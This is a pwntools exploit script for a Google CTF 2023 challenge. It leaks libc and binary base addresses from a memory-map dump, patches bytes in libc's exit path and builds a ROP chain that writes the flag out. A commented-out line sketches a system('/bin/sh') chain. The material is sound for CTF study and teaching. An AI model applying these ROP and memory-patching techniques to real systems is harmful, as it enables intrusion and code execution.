#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./chal_patched --host wfw1.2023.ctfcompetition.com --port 1337
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chal_patched')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wfw3.2023.ctfcompetition.com'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
  '''Execute the target binary locally'''
  if args.GDB:
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    return process([exe.path] + argv)

def start_remote(argv=[], *a, **kw):
  '''Connect to the process on the remote host'''
  io = connect(host, port)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io

def start(argv=[], *a, **kw):
  '''Start the exploit against the target.'''
  if args.LOCAL:
    return start_local(argv, *a, **kw)
  else:
    return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

"""
55fb70427000-55fb70428000 r--p 00000000 00:11e 810424                    /home/user/chal
"""
def parse_maps(maps):
  addresses = re.sub(r' .*', '', maps.decode()).replace('\n', '-').split('-')
  # print(maps.decode())
  # print(addresses)
  if args.HOST == '127.0.0.1':
    elf_base = int(addresses[1], 16)
    libc_base = int(addresses[16], 16)
  else:
    libc_base = int(addresses[14], 16)
    elf_base = int(addresses[1], 16)
  return libc_base, elf_base


io = start()


io.recvuntil(b"For otherwise I will surely expire")
maps = io.recvuntil(b'\n\n')

libc_base, elf_base = parse_maps(maps)
libc.address = libc_base
exe.address = elf_base

log.info('Libc base: ' + hex(libc_base))
log.info('Elf base: ' + hex(exe.address))

# pause()
p = lambda x, y: (hex(x) + ' ' + str(y)).encode().ljust(0x40, b'\0')


string_err_addr = libc.address + 0x1d85a4
io.send(p(string_err_addr, 100))

__run_exit_handlers = libc.address + 0x4560b
io.send(p(__run_exit_handlers, 1))
io.send(p(__run_exit_handlers + 1, 1))
io.send(p(__run_exit_handlers + 2, 1))
io.send(p(__run_exit_handlers + 3, 2))

exit_addr = libc.address + 0x455f0
io.send(p(exit_addr, 4))
io.send(p(exit_addr+4, 2))
# 0x43 54 46 7b 43 54
#   C  T  F  {  C  T

pop_rdi = libc.address + 0x2a3e5
system_addr = libc.address + 0x50d60
bin_sh_addr = libc.address + 0x1d8698
# io.sendline(p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))

rop = ROP(libc)

flag_location = exe.address + 0x50a0
rop.call('write', [1337, flag_location, 100])
log.info(rop.dump())
io.sendline(rop.chain())

io.interactive()

